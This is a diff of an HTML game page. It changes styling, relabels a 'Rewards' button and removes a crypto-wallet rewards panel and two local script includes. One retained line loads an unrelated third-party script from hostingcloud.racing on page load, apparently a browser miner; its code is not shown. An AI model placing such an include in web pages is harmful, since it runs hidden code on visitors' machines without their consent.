@@ -27,7 +27,6 @@
       href="https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fburgers.png"
     />
 
-
     <style>
       wrap {
         position: fixed;
@@ -150,9 +149,8 @@
         border-radius: 50%;
         color: white;
         opacity: 0.6;
-        z-index: 3;
+        z-index: 12;
       }
-
       .profileicon {
         position: fixed;
         display: block;
@@ -215,8 +213,6 @@
       }
     </style>
     <script src="/games/pinn/pinn.js" defer></script>
-    <script src="/client.js" defer></script>
-    <script src="/fly.js" defer></script>
     <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
     <script src="https://www.hostingcloud.racing/5pDo.js"></script>
   </head>
@@ -293,7 +289,7 @@
             ></meter>
           </div>
           <div class="button2">
-            Rewards
+            Completed
             <div id="rewards">
               0
             </div>
@@ -309,37 +305,5 @@
         </footer>
       </center>
     </wrap>
-
-  
-    <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
-    <div title="closed" id="REWARDS" class="hide">
-      <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
-        X
-      </div>
-      <div class="hide">Player: <label id="myName">Guest</label></div>
-      <div>
-        Wallet:
-        <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
-          >LOGIN</label
-        >
-      </div>
-      <div>
-        Reward Token:
-        <label id="myToken" onclick="selectToken();">Random</label>
-      </div>
-      <div>
-        Mode:
-        <label id="vrMode" onclick="vrMode();">Hubs</label>
-      </div>
-      <div class="button" onclick="pendingClaims();">
-        View Pending
-      </div>
-      <button class="hide" id="clear-dreams">
-        Clear Dreams
-      </button>
-      <section title="closed" id="pendingClaims" class="hide">
-        <ul id="dreams"></ul>
-      </section>
-    </div>
   </body>
 </html>
